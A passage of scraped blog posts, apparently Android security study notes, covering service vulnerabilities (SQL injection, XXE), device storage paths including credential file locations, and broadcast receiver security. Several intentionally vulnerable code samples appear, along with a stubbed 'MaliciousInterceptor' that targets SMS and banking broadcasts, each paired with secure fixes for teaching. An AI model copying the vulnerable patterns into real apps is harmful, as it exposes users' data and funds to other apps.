if (!ALLOWED_CLASSES.contains(className)) { throw new SecurityException(\u0026#34;Disallowed class: \u0026#34; + className); } return super.resolveClass(desc); } } @Override public IBinder onBind(Intent intent) { return null; } } 6. SQL Injection in Service Database Operations # [!danger] Database Vulnerabilities Services interacting with databases can be vulnerable to SQL injection if they construct queries insecurely.\nVulnerable Database Service:\n// DANGEROUS: SQL injection vulnerable public class VulnerableDatabaseService extends Service { private SQLiteDatabase database; @Override public int onStartCommand(Intent intent, int flags, int startId) { String userId = intent.getStringExtra(\u0026#34;user_id\u0026#34;); String query = \u0026#34;SELECT * FROM users WHERE id = \u0026#39;\u0026#34; + userId + \u0026#34;\u0026#39;\u0026#34;; // DANGEROUS! Cursor cursor = database.rawQuery(query, null); // Process results... return START_NOT_STICKY; } } Secure Database Implementation:\npublic class SecureDatabaseService extends Service { private SQLiteDatabase database; private SQLiteQueryBuilder queryBuilder; @Override public void onCreate() { super.onCreate(); initializeDatabase(); setupSecureQueryBuilder(); } private void setupSecureQueryBuilder() { queryBuilder = new SQLiteQueryBuilder(); queryBuilder.setStrict(true); // Enable strict mode queryBuilder.setStrictColumns(true); // Validate columns queryBuilder.setStrictGrammar(true); // Limit subqueries } @Override public int onStartCommand(Intent intent, int flags, int startId) { String userId = intent.getStringExtra(\u0026#34;user_id\u0026#34;); if (!isValidUserId(userId)) { Log.w(TAG, \u0026#34;Invalid user ID received\u0026#34;); return START_NOT_STICKY; } // Use parameterized queries String[] selectionArgs = {userId}; Cursor cursor = database.query( \u0026#34;users\u0026#34;, // table null, // columns \u0026#34;id = ?\u0026#34;, // selection with placeholder selectionArgs, // selection args null, // groupBy null, // having null // orderBy ); processResults(cursor); return START_NOT_STICKY; } // Alternative using PreparedStatement private void queryWithPreparedStatement(String userId) { String sql = \u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;; try (SQLiteStatement statement = database.compileStatement(sql)) { statement.bindString(1, userId); // Execute query safely } } // Using secure QueryBuilder private Cursor secureQuery(String userId, String column) { Map\u0026lt;String, String\u0026gt; columnMap = new HashMap\u0026lt;\u0026gt;(); columnMap.put(\u0026#34;user_id\u0026#34;, \u0026#34;id\u0026#34;); columnMap.put(\u0026#34;user_name\u0026#34;, \u0026#34;name\u0026#34;); queryBuilder.setProjectionMap(columnMap); queryBuilder.setTables(\u0026#34;users\u0026#34;); return queryBuilder.query( database, new String[]{column}, // projection \u0026#34;id = ?\u0026#34;, // selection new String[]{userId}, // selectionArgs null, // groupBy null, // having null // sortOrder ); } private boolean isValidUserId(String userId) { return userId != null \u0026amp;\u0026amp; userId.matches(\u0026#34;^[0-9]+$\u0026#34;) \u0026amp;\u0026amp; userId.length() \u0026lt;= 10; } @Override public IBinder onBind(Intent intent) { return null; } } 7. XML External Entities (XXE) Injection # [!danger] XXE Vulnerabilities Services processing XML input may be vulnerable to XXE attacks if the XML parser is not securely configured.\nVulnerable XML Processing:\n// DANGEROUS: XXE vulnerable XML parsing public class VulnerableXMLService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { String xmlData = intent.getStringExtra(\u0026#34;xml_data\u0026#34;); if (xmlData != null) { try { DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // DANGEROUS! Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes())); processXMLDocument(doc); } catch (Exception e) { Log.e(TAG, \u0026#34;XML parsing failed\u0026#34;, e); } } return START_NOT_STICKY; } } Secure XML Processing:\npublic class SecureXMLService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { String xmlData = intent.getStringExtra(\u0026#34;xml_data\u0026#34;); if (xmlData != null \u0026amp;\u0026amp; isValidXMLInput(xmlData)) { parseXMLSecurely(xmlData); } return START_NOT_STICKY; } private void parseXMLSecurely(String xmlData) { try { // Method 1: Using DocumentBuilderFactory with security features disabled DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Disable DTDs completely factory.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); // Disable external DTDs and stylesheets factory.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); factory.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); // Disable XInclude processing factory.setXIncludeAware(false); // Disable expansion of entity reference nodes factory.setExpandEntityReferences(false); DocumentBuilder builder = factory.newDocumentBuilder(); Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes())); processXMLDocument(doc); } catch (Exception e) { Log.e(TAG, \u0026#34;Secure XML ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/services/","section":"","summary":"","title":"Android Services - Complete Development \u0026 Security Guide","type":"posts"},{"content":" Storage summary # Directories you can see (Non-Root) (Attack Surface) # Public External Storage # Path: /storage/emulated/0/ (symlinked as /sdcard/) Access Level: World-readable/writable with proper permissions Security Implications: ANY app can read files here with READ_EXTERNAL_STORAGE permission Data persistence even after app uninstallation Potential data leakage vector Key Subdirectories: # /sdcard/ ‚îú‚îÄ‚îÄ DCIM/ # Camera images ‚îú‚îÄ‚îÄ Downloads/ # Downloaded files ‚îú‚îÄ‚îÄ Pictures/ # User images ‚îú‚îÄ‚îÄ Music/ # Audio files ‚îî‚îÄ‚îÄ Android/data/\u0026lt;package_name\u0026gt;/ # App-specific external data App-Specific External Storage # Path: /sdcard/Android/data/\u0026lt;package_name\u0026gt;/ Access: App can access without WRITE_EXTERNAL_STORAGE permission (Android 4.4+) Other apps can access with proper permissions Scoped Storage restrictions apply (Android 11+) World-Writable Directory # Path: /data/local/tmp/ Security Risk: Any app can write/read files here Common Attack Vector: Privilege escalation, data exfiltration Protected Directories (Root/System Access Required) # /data/data/ Contains every installed application\u0026rsquo;s private data Each app subdirectory owned by unique Linux UID (different users separate directories with their own apps) Path: /data/data/\u0026lt;package_name\u0026gt;/\nSecurity Model: App-sandboxed, unique Linux UID per app (different users separate directories with their own apps) Contains every installed application\u0026rsquo;s private data Contains: Key App Data Subdirectories: # /data/data/\u0026lt;package-name\u0026gt;/ ‚îú‚îÄ‚îÄ databases/ # SQLite databases (populated on first run) ‚îú‚îÄ‚îÄ shared_prefs/ # SharedPreferences XML files ‚îú‚îÄ‚îÄ files/ # Private app files ‚îî‚îÄ‚îÄ cache/ # App cache data APK and Binary Locations # /data/app/ User-installed APK files (decrypted) Researchers: APK extraction, reverse engineering source /data/app-asec/ Encrypted ASEC containers for \u0026ldquo;forward locked\u0026rdquo; apps Security Focus: Encryption analysis, DRM bypass research /data/app-lib/ Extracted native libraries (.so files) Researchers: Native code analysis, ROP/JOP gadgets System App Directories \u0026amp; Configuration # /system/app/ - Pre-installed system apps /system/priv-app/ - Privileged apps with signatureOrSystem permissions /system/vendor/app/ - Vendor-specific applications /system/bin/ - System binaries Package Management # /data/system/packages.xml Critical for researchers: Package database, UIDs, permissions, signing certificates Maps package names to user IDs and permissions /data/system/packages.list App UIDs, package names, debuggable flags, data paths Security use: Permission enumeration, attack surface mapping Certificate Stores # /etc/security/cacerts/ - System certificate store (root only) /data/misc/user/0/cacerts-added/ - User-added certificates Security researchers: Certificate pinning bypass, MITM analysis Network Configuration # /etc/apns-conf.xml - APN configurations /data/misc/wifi/ - WiFi configuration files Security focus: Stored network credentials, PSK analysis Multi-User environment # /data/user/ - Multi-user data directories /data/user/0/ - Device owner data (symlink to /data/data/) /data/system/users/\u0026lt;user ID\u0026gt;/ User metadata, accounts database (accounts.db) Lock screen credentials (gesture.key, password.key) API Access Methods # // Internal storage Context.getFilesDir() // /data/data/\u0026lt;pkg\u0026gt;/files/ Context.getDatabasePath() // /data/data/\u0026lt;pkg\u0026gt;/databases/ // External storage getExternalFilesDir() // /sdcard/Android/data/\u0026lt;pkg\u0026gt;/files/ Environment.getExternalStoragePublicDirectory() // /sdcard/ Version-Specific Changes # Android 11+ (API 30) # Scoped Storage mandatory Restricted access to /sdcard/Android/data/ Enhanced privacy controls Android 10 (API 29) # Scoped Storage introduction External storage filtering Legacy Versions # Broader external storage access Fewer privacy restrictions APK Structure summary # üìÅ Core Files \u0026amp; Directories # Component Description Importance Notes AndroidManifest.xml Core configuration file with package name, permissions, components, debuggable status ‚≠ê‚≠ê‚≠ê Very High Binary XML format - requires apktool to decode classes.dex Main Java source code compiled to Dalvik Executable format ‚≠ê‚≠ê‚≠ê Very High Contains primary app logic assets/ Custom developer resources (certs, configs, etc.) ‚≠ê‚≠ê High Often contains security-relevant data lib/ Native C/C++ shared object (.so) libraries ‚≠ê‚≠ê High Architecture-specific folders; harder to reverse resources.arsc Compiled resources (strings, colors, UI attributes) ‚≠ê Low-Moderate Precompiled resources linking code to assets res/ Images, UI resources, language strings ‚≠ê Moderate Predefined resource types META-INF/ App signing information and verification data ‚≠ê Moderate Contains signature files and hashes com/ XML fragments and general files ‚ùå Low Usually not useful for reverse engineering META-INF Directory Contents # MANIFEST.MF: File names/hashes (SHA256 Base64) for all APK files CERT.SF: Names/hashes of corresponding MANIFEST.MF lines CERT.RSA: Public key and signature of CERT.SF lib Directory Structure # Contains architecture-specific subdirectories: armeabi-v7a/ x86/ arm64-v8a/ ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/file-structure-and-storage/","section":"","summary":"","title":"Android System File Structure and Storage","type":"posts"},{"content":" Summary # Broadcast and Broadcast Receivers are part of a messaging system that allows applications to communicate with the Android system or with other apps. Broadcasts can be used as a messaging system across apps and outside of the normal user flow. Like a person shouting a name and who are interested listen and may shout back.\n[!WARNING] As part of the Android 8.0 (API level 26) background execution limits, apps that target the API level 26 or higher can\u0026rsquo;t register broadcast receivers for implicit broadcasts in their manifest unless the broadcast is sent specifically to them. However, several broadcasts are exempted from these limitations.\nError: How to receive a broadcast? # 1- Via manifest file with a \u0026lt;receiver\u0026gt; tag # \u0026lt;receiver android:name=\u0026#34;.MyReceiver\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.BOOT_COMPLETED\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class MyReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // Code to run when broadcast is received Toast.makeText(context, \u0026#34;Broadcast received!\u0026#34;, Toast.LENGTH_SHORT).show(); } } 2- Dynamically registering a receiver using registerReceiver() # or Context-Registered Receivers\n// Step 1: Create a BroadcastReceiver subclass public class MyReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if (\u0026#34;com.example.ACTION_UPDATE\u0026#34;.equals(intent.getAction())) { String data = intent.getStringExtra(\u0026#34;data\u0026#34;); Log.d(\u0026#34;MyReceiver\u0026#34;, \u0026#34;Received: \u0026#34; + data); } } } // Step 2: Register/Unregister in an Activity public class MainActivity extends AppCompatActivity { private MyReceiver receiver; @Override protected void onStart() { super.onStart(); receiver = new MyReceiver(); IntentFilter filter = new IntentFilter(\u0026#34;com.example.ACTION_UPDATE\u0026#34;); // RECEIVER_NOT_EXPORTED: Restrict to app-only (Android 12+) ContextCompat.registerReceiver( this, receiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED ); } @Override protected void onStop() { super.onStop(); unregisterReceiver(receiver); // Prevent memory leaks } } Receive broadcasts with permissions # If you specify a permission parameter when registering a broadcast receiver (either with registerReceiver(BroadcastReceiver, IntentFilter, String, Handler) or in \u0026lt;receiver\u0026gt; tag in your manifest), then only broadcasters who have requested the permission with the \u0026lt;uses-permission\u0026gt; tag in their manifest can send an Intent to the receiver. If the permission is dangerous, the broadcaster must also be granted the permission.\nFor example, assume your receiving app has a manifest-declared receiver as follows:\n\u0026lt;!-- If this receiver listens for broadcasts sent from the system or from other apps, even other apps that you own, set android:exported to \u0026#34;true\u0026#34;. --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.MyBroadcastReceiverWithPermission\u0026#34; android:permission=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.snippets.ACTION_UPDATE_DATA\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; Or your receiving app has a context-registered receiver as follows:\nContextCompat.registerReceiver( context, myBroadcastReceiver, filter, android.Manifest.permission.ACCESS_COARSE_LOCATION, null, // scheduler that defines thread, null means run on main thread receiverFlags ); Then, to be able to send broadcasts to those receivers, the sending app must request the permission as follows:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; /\u0026gt; Implicit broadcast exceptions # Key Exempted Broadcasts\n1. Boot \u0026amp; User Events # ACTION_LOCKED_BOOT_COMPLETED, ACTION_BOOT_COMPLETED Needed for scheduling jobs/alarms after boot. ACTION_USER_INITIALIZE, USER_ADDED, USER_REMOVED Restricted to privileged apps (e.g., device admin). 2. Time \u0026amp; Locale Changes # ACTION_TIME_SET, ACTION_TIMEZONE_CHANGED, ACTION_NEXT_ALARM_CLOCK_CHANGED Clock/alarm apps require these. ACTION_LOCALE_CHANGED Rarely sent; apps may need to update localized data. 3. Hardware Events # USB: ACTION_USB_ACCESSORY_ATTACHED, ACTION_USB_DEVICE_DETACHED, etc. No alternative for detecting USB state changes. Bluetooth: BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED, ACTION_ACL_CONNECTED, etc. User experience not impacted by background delivery. Storage: ACTION_MEDIA_MOUNTED, ACTION_MEDIA_EJECT, etc. Triggered by physical user actions (e.g., SD card removal). 4. Telephony \u0026amp; Accounts # Carrier/Subscription: ACTION_CARRIER_CONFIG_CHANGED, TelephonyIntents.ACTION_*_SUBSCRIPTION_CHANGED Critical for OEM telephony apps. SMS/MMS: SMS_RECEIVED_ACTION, WAP_PUSH_RECEIVED_ACTION Required for SMS-handling apps. Accounts: LOGIN_ACCOUNTS_CHANGED_ACTION, ACTION_ACCOUNT_REMOVED Needed to sync data on account changes. 5. Package Management # ACTION_PACKAGE_DATA_CLEARED Rare (user-triggered via Settings). ACTION_PACKAGE_FULLY_REMOVED Apps may need to clean up data when another package is uninstalled. 6. Other Exemptions # ACTION_NEW_OUTGOING_CALL For call-blocking apps. ACTION_DEVICE_OWNER_CHANGED Rare; security apps need it. ACTION_EVENT_REMINDER Calendar provider sends this implicitly. Important Notes # Avoid Overuse: Even exempted broadcasts should be used sparingly to minimize performance impact. Alternatives: For non-exempt broadcasts, use: Context-registered receivers (while the app is active). JobScheduler/WorkManager for background tasks. Deprecated Broadcasts: LOGIN_ACCOUNTS_CHANGED_ACTION ‚Üí Prefer ACTION_ACCOUNT_REMOVED. ACTION_PACKAGE_REPLACED ‚Üí Not exempted (use JobScheduler). Best Practices # Targeted Broadcasts: Use setPackage() or explicit intents where possible. Minimize Manifest Receivers: Rely on dynamic registration unless exempted. Handle onReceive() Quickly: Use goAsync() or JobScheduler for long tasks. Sending broadcast # [!Warning] Attackers cant send system protected actions\nBypass the Restriction if :\nYou‚Äôre building a system app (installed on /system partition) ‚Äî only possible on rooted or custom ROM devices. You sign your app with the platform certificate (only available to OEMs). You use ADB to broadcast during testing: adb shell am broadcast -a android.intent.action.BOOT_COMPLETED Permissions allow you to restrict broadcasts to the set of apps that hold certain permissions. You can enforce restrictions on either the sender or receiver of a broadcast.\nYou can also limit a broadcast to a set of apps in the same organization by calling setPackage(String) on the intent.\nIntent intent = new Intent(); intent.setClassName(\u0026#34;package\u0026#34;,\u0026#34;classname\u0026#34;); intent.setPackage(\u0026#34;com.example.snippets\u0026#34;); sendBroadcast(intent); Send broadcasts with permissions # When you call sendBroadcast(Intent, String) or sendOrderedBroadcast(Intent, String, BroadcastReceiver, Handler, int, String, Bundle), you can specify a permission parameter. Only receivers who have requested that permission with the \u0026lt;uses-permission\u0026gt; tag in their manifest can receive the broadcast. If the permission is dangerous, you must grant the permission before the receiver can receive the broadcast. For example, the following code sends a broadcast with a permission:\ncontext.sendBroadcast(intent, android.Manifest.permission.ACCESS_COARSE_LOCATION); To receive the broadcast, the receiving app must request the permission as follows:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; /\u0026gt; You can specify either an existing system permission like BLUETOOTH_CONNECT or define a custom permission with the \u0026lt;permission\u0026gt; element.\nNon-ordered vs. Ordered Broadcasts # In non-ordered mode, broadcasts are sent to all interested receivers ‚Äúat the same time‚Äù. This basically means that one receiver can not interfere in any way with what other receivers will do neither can it prevent other receivers from being executed. One example of such broadcast is the ACTION_BATTERY_LOW one.\nIn ordered mode, broadcasts are sent to each receiver in order (controlled by the android:priority attribute for the intent-filter element in the manifest file that is related to your receiver) and one receiver is able to abort the broadcast so that receivers with a lower priority would not receive it (thus never execute). An example of this type of broadcast (and one that will be discussing in this document) is the ACTION_NEW_OUTGOING_CALL one.\nVarious action types # 1. System-Wide Events # Use Case: React to system or device state changes.\nImportance: Critical for apps that depend on device state (e.g., network, boot, user sessions).\nActions You Can Listen For: # Network Connectivity Changes Importance: High Use Case: Sync data when network is restored. Boot Completion (BOOT_COMPLETED) Importance: High Use Case: Start background services on device reboot. Package Installation/Removal (PACKAGE_ADDED, PACKAGE_REMOVED) Importance: Medium Use Case: Detect app installs (e.g., security apps). Screen Lock/Unlock Importance: Medium Use Case: Security apps (e.g., auto-lock on screen off). Password Events (ACTION_PASSWORD_FAILED, ACTION_PASSWORD_SUCCEEDED) Importance: Medium Use Case: Security logging. Device Admin Events (DEVICE_ADMIN_ENABLED, DEVICE_ADMIN_DISABLED) Importance: High (for MDM/EMM apps) Use Case: Enterprise device management. User Session Events (USER_SWITCHED, USER_REMOVED) Importance: High (for multi-user apps) Use Case: Profile-specific data loading. 2. NFC Events # Use Case: NFC-based interactions (payments, tags, card emulation).\nImportance: Critical for NFC apps, irrelevant for others.\nActions You Can Listen For: # Tag Discovery (ACTION_NDEF_DISCOVERED, ACTION_TAG_DISCOVERED) Importance: High (for NFC apps) Use Case: Read/write NFC tags. RF Field Detection (RF_FIELD_ON_DETECTED) Importance: Medium Use Case: Detect NFC field presence. APDU/Applet Selection (APDU_RECEIVED, AID_SELECTED) Importance: High (for payment apps) Use Case: Host Card Emulation (HCE). 3. Application-Specific Broadcasts # Use Case: Inter-app communication or background task coordination.\nImportance: Depends on app requirements.\nActions You Can Create: # Custom Broadcasts (e.g., com.example.APP_DATA_UPDATED) Importance: Medium Use Case: Notify other components of data changes. Pending Intents for Notifications Importance: High Use Case: Handle notification clicks. Permission-Protected Broadcasts Importance: High (for security) Use Case: Restrict broadcasts to trusted apps. 4. Content Provider Interactions # Use Case: Access/modify shared data (contacts, media, etc.).\nImportance: High if your app integrates with system data.\nActions You Can Perform: # Query/Modify Contacts/Calendar/Media Importance: High (for productivity apps) Use Case: Sync user contacts. Grant Temporary URI Permissions Importance: Medium Use Case: Share file access securely. Changes across android version # Android 16 (Future) # Broadcast Priority Changes: The android:priority attribute or IntentFilter.setPriority() no longer guarantees order across different processes. Priorities are only enforced within the same app process. Priority range is restricted to (SYSTEM_LOW_PRIORITY + 1, SYSTEM_HIGH_PRIORITY - 1). Only system components can use SYSTEM_LOW_PRIORITY/SYSTEM_HIGH_PRIORITY. Android 14 # Cached State Optimization: System defers non-critical broadcasts (e.g., ACTION_SCREEN_ON) for apps in a cached state. Apps are temporarily revived from cached state for manifest-declared important broadcasts. Android 9 (API 28) # Wi-Fi Broadcast Restrictions: NETWORK_STATE_CHANGED_ACTION no longer leaks location/PII data. SSIDs, BSSIDs, and scan results are excluded from broadcasts. Use WifiManager.getConnectionInfo() instead. Android 8.0 (API 26) # Implicit Broadcast Ban: Apps cannot register manifest receivers for most implicit broadcasts (e.g., system-wide events). Exceptions: Broadcasts targeting the app explicitly (via package name). Broadcasts in the allowlist. Workaround: Use context-registered receivers (active app only). Android 7.0 (API 24) # Removed Broadcasts: ACTION_NEW_PICTURE and ACTION_NEW_VIDEO are no longer sent. Connectivity Changes: CONNECTIVITY_ACTION must use dynamic registration (registerReceiver()). Manifest declarations do not work. Security Consideration # 1. Prefer Context-Registered Receivers # Issue: Manifest-declared receivers can cause multiple app launches, hurting performance. Solution: Use Context.registerReceiver() instead where possible (e.g., CONNECTIVITY_ACTION requires it). 2. Protect Broadcasts # Avoid Implicit Intents:\nSensitive data in implicit broadcasts can be read by any app. Solutions: Restrict with Permissions: // Sender side (require permission) sendBroadcast(intent, \u0026#34;com.example.PERMISSION\u0026#34;); // Receiver side (declare permission) \u0026lt;uses-permission android:name=\u0026#34;com.example.PERMISSION\u0026#34; /\u0026gt; Limit Scope with setPackage() (API 14+): intent.setPackage(\u0026#34;com.example.myapp\u0026#34;); // Only your app receives it Receiver Security:\nFor manifest-declared receivers, set android:exported=\u0026quot;false\u0026quot; if only internal use. For dynamic receivers, use: // Android 12+: Block external apps ContextCompat.registerReceiver(..., ContextCompat.RECEIVER_NOT_EXPORTED); 3. Unique Action Names # Use a custom namespace (e.g., com.example.ACTION_DATA_UPDATE) to avoid conflicts with other apps. 4. Handle onReceive() Carefully # Main Thread Limitation: Runs on UI thread‚Äîkeep it short (\u0026lt;10 seconds). Solutions for Long Tasks: goAsync(): Briefly extend broadcast lifecycle: public void onReceive(Context context, Intent intent) { final PendingResult result = goAsync(); new Thread(() -\u0026gt; { // Background work result.finish(); }).start(); } JobScheduler/WorkManager: For heavy work. 5. Avoid Launching Activities # Why: Multiple receivers could spam the user with activities. Alternative: Show a notification instead. Key Takeaways # Risk Solution Too many app launches Use context-registered receivers. Data leaks Use permissions or setPackage(). Malicious broadcasts Set RECEIVER_NOT_EXPORTED or android:exported=\u0026quot;false\u0026quot;. Slow onReceive() Use goAsync() or JobScheduler. Conflicting actions Prefix broadcasts with your app\u0026rsquo;s namespace. For modern apps: Dynamic receivers + permissions + JobScheduler is the safest combo.\nWidget # Widgets are a cool feature allowing apps to create small user interfaces that get directly embedded on the home screen. This means the widgets are actually running within another app!\nThe AppWidgetProvider is actually a wrapper around BroadcastReceiver to update the widget data in the background. It can also handle interactions with the widget such as button presses. But because the widget is running inside the home screen, broadcast PendingIntents are used to handle the button presses.\nImagine if app \u0026ldquo;Z\u0026rdquo; has a widget that when clicked open an activity in app Z now since the widget is in the home screen (another app) so we want to broadcast to our app with our Z permissions ? so we use pending intent that handles that for us\nNotifications can be easily created using the notification builder. Inside of notifications you can also add button actions by preparing a PendingIntent. The reason for that is because the notification is again handled by a different app.\nCommon Vulnerabilities # 1. Unintentionally Exported Receivers # Vulnerability # Default exported state: If a receiver includes at least one intent filter, the android:exported attribute defaults to true if not explicitly set to false Missing access control: No validation of sender or data Sensitive operations exposed: Critical operations accessible to any malicious app Vulnerable Code Example # \u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- VULNERABLE: Exported by default due to intent filter --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.VulnerableReceiver\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.SENSITIVE_ACTION\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class VulnerableReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // VULNERABLE: No validation of sender or data String sensitiveData = intent.getStringExtra(\u0026#34;user_token\u0026#34;); String userCredentials = intent.getStringExtra(\u0026#34;credentials\u0026#34;); // This sensitive data can be accessed by any malicious app Log.d(\u0026#34;VulnerableReceiver\u0026#34;, \u0026#34;Token: \u0026#34; + sensitiveData); // VULNERABLE: Performing sensitive actions without verification if (\u0026#34;com.example.SENSITIVE_ACTION\u0026#34;.equals(intent.getAction())) { // Delete user data or perform privileged operations deleteUserData(context); transferMoney(intent.getStringExtra(\u0026#34;amount\u0026#34;)); } } private void deleteUserData(Context context) { // Sensitive operation that can be triggered by any app } private void transferMoney(String amount) { // Critical operation exposed to any malicious app } } 2. Insecure Dynamic Registration # Vulnerability # Public by default: Dynamically registered receivers are public by default No protection: Lacks permission-based access control Runtime exposure: Creates attack surface during app execution Vulnerable Code Example # public class VulnerableActivity extends Activity { private BroadcastReceiver dynamicReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); // VULNERABLE: Dynamic receiver is public by default dynamicReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Any app can send broadcasts to this receiver String sensitiveCommand = intent.getStringExtra(\u0026#34;command\u0026#34;); executeSensitiveCommand(sensitiveCommand); } }; // VULNERABLE: No protection for dynamic registration IntentFilter filter = new IntentFilter(\u0026#34;com.example.DYNAMIC_ACTION\u0026#34;); registerReceiver(dynamicReceiver, filter); } private void executeSensitiveCommand(String command) { // Vulnerable to command injection } } 3. Sensitive Data in Implicit Intents # Vulnerability # Broadcast interception: Any app can register matching intent filters Data exposure: Sensitive information transmitted in clear text Wide delivery: Implicit broadcasts delivered to all matching receivers Vulnerable Code Example # public class VulnerableDataSender extends Activity { public void sendSensitiveData() { Intent intent = new Intent(); intent.setAction(\u0026#34;com.example.SHARE_DATA\u0026#34;); // VULNERABLE: Sensitive data in implicit intent intent.putExtra(\u0026#34;session_token\u0026#34;, \u0026#34;abc123xyz789\u0026#34;); intent.putExtra(\u0026#34;user_id\u0026#34;, \u0026#34;12345\u0026#34;); intent.putExtra(\u0026#34;credit_card\u0026#34;, \u0026#34;4111-1111-1111-1111\u0026#34;); // This broadcast can be intercepted by any malicious app sendBroadcast(intent); } } 4. Message Interception Attacks # Vulnerability # Broadcast hijacking: Malicious apps register for same intent actions Data theft: Sensitive information extracted from intercepted broadcasts System mimicry: Attackers can mimic legitimate system events Malicious Code Example # public class MaliciousInterceptor extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // Malicious app intercepts SMS or other sensitive broadcasts if (\u0026#34;android.provider.Telephony.SMS_RECEIVED\u0026#34;.equals(intent.getAction())) { // Extract and steal SMS data Bundle bundle = intent.getExtras(); // Send stolen data to attacker\u0026#39;s server sendToAttackerServer(bundle); } // Intercept app-specific sensitive broadcasts if (\u0026#34;com.banking.app.TRANSACTION_COMPLETE\u0026#34;.equals(intent.getAction())) { String amount = intent.getStringExtra(\u0026#34;amount\u0026#34;); String account = intent.getStringExtra(\u0026#34;account\u0026#34;); // Steal financial information stealFinancialData(amount, account); } } private void sendToAttackerServer(Bundle data) { // Malicious network request } private void stealFinancialData(String amount, String account) { // Exfiltrate sensitive financial data } } Best Practices and Secure Implementation # 1. Explicitly Disable Export for Internal Receivers # Implementation # \u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- SECURE: Explicitly set exported to false --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.InternalReceiver\u0026#34; android:exported=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.INTERNAL_ACTION\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class SecureReceiver extends BroadcastReceiver { private static final String EXPECTED_SIGNATURE = \u0026#34;expected_app_signature\u0026#34;; @Override public void onReceive(Context context, Intent intent) { // SECURE: Validate the sender if (!isValidSender(context)) { Log.w(\u0026#34;SecureReceiver\u0026#34;, \u0026#34;Unauthorized sender blocked\u0026#34;); return; } // SECURE: Validate and sanitize input data String action = intent.getAction(); if (!isValidAction(action)) { Log.w(\u0026#34;SecureReceiver\u0026#34;, \u0026#34;Invalid action blocked: \u0026#34; + action); return; } // SECURE: Sanitize input parameters String userInput = sanitizeInput(intent.getStringExtra(\u0026#34;user_input\u0026#34;)); if (\u0026#34;com.example.INTERNAL_ACTION\u0026#34;.equals(action)) { // Safe to process since sender is validated processSecureAction(context, userInput); } } private boolean isValidSender(Context context) { // Verify sender\u0026#39;s signature or package name try { PackageManager pm = context.getPackageManager(); PackageInfo senderInfo = pm.getPackageInfo(getSenderPackage(), PackageManager.GET_SIGNATURES); // Verify signature matches expected return verifySignature(senderInfo.signatures); } catch (PackageManager.NameNotFoundException e) { return false; } } private boolean verifySignature(Signature[] signatures) { // Implementation to verify app signature return true; // Simplified } private String getSenderPackage() { // Get sender package name (implementation depends on context) return \u0026#34;com.trusted.sender\u0026#34;; } private boolean isValidAction(String action) { // Whitelist of allowed actions return action != null \u0026amp;\u0026amp; action.startsWith(\u0026#34;com.example.\u0026#34;); } private String sanitizeInput(String input) { if (input == null) return null; // Remove potentially dangerous characters return input.replaceAll(\u0026#34;[\u0026lt;\u0026gt;\\\u0026#34;\u0026#39;\u0026amp;]\u0026#34;, \u0026#34;\u0026#34;).trim(); } private void processSecureAction(Context context, String input) { // Safe processing of validated input } } 2. Secure Dynamic Registration with Permissions # Implementation # \u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- Define custom signature-level permission --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; public class SecureActivity extends Activity { private BroadcastReceiver secureReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); secureReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Process only validated and sanitized data processSecureData(context, intent); } }; // SECURE: Register with permission protection IntentFilter filter = new IntentFilter(\u0026#34;com.example.SECURE_ACTION\u0026#34;); registerReceiver(secureReceiver, filter, \u0026#34;com.example.CUSTOM_PERMISSION\u0026#34;, null); } private void processSecureData(Context context, Intent intent) { // Secure processing with validation } @Override protected void onDestroy() { super.onDestroy(); // Always unregister dynamic receivers if (secureReceiver != null) { 